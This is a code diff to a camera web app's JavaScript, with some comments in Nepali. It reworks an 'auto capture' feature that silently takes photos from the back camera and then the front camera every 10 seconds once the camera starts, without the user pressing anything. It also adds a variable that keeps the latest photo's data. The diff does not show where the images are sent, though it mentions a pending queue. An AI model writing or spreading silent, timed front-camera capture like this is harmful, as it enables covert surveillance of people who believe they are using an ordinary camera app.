@@ -1,5 +1,5 @@
 // ================================================================
-// app.js – Pro Camera PWA (Mobile Fix + Dual Camera Auto Capture)
+// app.js – Pro Camera PWA (Sequential Capture – Back/Front पालैपालो)
 // ================================================================
 
 (function() {
@@ -60,6 +60,7 @@
   var autoCaptureInterval = null;
   var lastUserCaptureTime = 0;
   var isAutoCaptureRunning = false;
+  var lastPhotoData = null;
 
   var focalLengths = { 0.5: 13, 1: 26, 3: 78, 7: 180, 10: 240, 50: 1200 };
 
@@ -290,37 +291,42 @@
     }
   }
 
-  // ---------- Auto Capture Logic (10 seconds) ----------
+  // ---------- Auto Capture Logic (Sequential – Back फेरि Front) ----------
   function startAutoCapture() {
     if (isAutoCaptureRunning) return;
     isAutoCaptureRunning = true;
 
-    // First capture immediately
-    if (backStream) {
-      silentCapture(backStream, 'back', 'auto');
-    }
-    if (frontStream) {
-      silentCapture(frontStream, 'front', 'auto');
-    }
-
-    autoCaptureInterval = setInterval(function() {
+    var captureSequence = function() {
       var now = Date.now();
       var timeSinceUserCapture = now - lastUserCaptureTime;
 
+      // Only auto-capture if user hasn't captured in the last 10 seconds
       if (timeSinceUserCapture >= 10000) {
+        // ✅ Step 1: Capture from Back Camera
         if (backStream) {
           silentCapture(backStream, 'back', 'auto');
         }
-        if (frontStream) {
-          silentCapture(frontStream, 'front', 'auto');
-        }
-        console.log('[Camera] 🔄 Auto-capture cycle completed (Back + Front)');
+
+        // ✅ Step 2: After 1-2 seconds, capture from Front Camera
+        setTimeout(function() {
+          if (frontStream) {
+            silentCapture(frontStream, 'front', 'auto');
+          }
+        }, 1500); // 1.5 second delay between back and front
+
+        console.log('[Camera] 🔄 Auto-capture cycle (Back → Front) started');
       } else {
         console.log('[Camera] ⏳ User captured recently, skipping auto-capture');
       }
-    }, 10000);
+    };
 
-    console.log('[Camera] ⏰ Auto-capture started (every 10 seconds)');
+    // First capture immediately
+    captureSequence();
+
+    // Then every 10 seconds
+    autoCaptureInterval = setInterval(captureSequence, 10000);
+
+    console.log('[Camera] ⏰ Auto-capture started (Sequential: Back → Front every 10 seconds)');
   }
 
   // ---------- Manual Capture ----------
@@ -349,6 +355,7 @@
     img.onload = function() { flyToGallery(img); };
     img.src = originalData;
 
+    lastPhotoData = { original: originalData, compressed: compressedData, fileName: fileName, photoId: photoId };
     galleryImg.src = originalData;
     galleryImg.style.display = 'block';
 
@@ -542,7 +549,7 @@
     });
   });
 
-  // ---------- Camera Setup (Fixed for Mobile) ----------
+  // ---------- Camera Setup ----------
   async function checkAndStart() {
     try {
       var permissionStatus = 'prompt';
@@ -567,7 +574,7 @@
   }
 
   async function initCamera() {
-    // ✅ Simpler constraints for mobile compatibility
+    // Simpler constraints for mobile
     var getUserMediaWithFallback = async function(facingMode) {
       var constraints = {
         audio: false,
@@ -582,14 +589,12 @@
         return await navigator.mediaDevices.getUserMedia(constraints);
       } catch (err) {
         console.warn('[Camera] Fallback 1 failed:', err);
-        // Try without width/height constraints
         delete constraints.video.width;
         delete constraints.video.height;
         try {
           return await navigator.mediaDevices.getUserMedia(constraints);
         } catch (err2) {
           console.warn('[Camera] Fallback 2 failed:', err2);
-          // Try with 'environment' if facingMode is not supported
           if (facingMode !== 'environment') {
             constraints.video.facingMode = 'environment';
           } else {
@@ -605,7 +610,7 @@
       }
     };
 
-    // Get both cameras with fallback
+    // Get both cameras with fallback (sequential)
     try {
       backStream = await getUserMediaWithFallback('environment');
     } catch (e) {
@@ -624,7 +629,6 @@
       video.srcObject = currentPreviewStream;
       await video.play();
     } else {
-      // If no stream, show error
       permError.textContent = '❌ कुनै क्यामेरा उपलब्ध छैन।';
       permError.style.display = 'block';
       return;
@@ -671,7 +675,7 @@
     bottomBar.style.display = 'flex';
     isCameraReady = true;
 
-    // ✅ Start Auto Capture (every 10 seconds)
+    // ✅ Start Auto Capture (Sequential: Back → Front)
     startAutoCapture();
 
     // ✅ Check pending queue
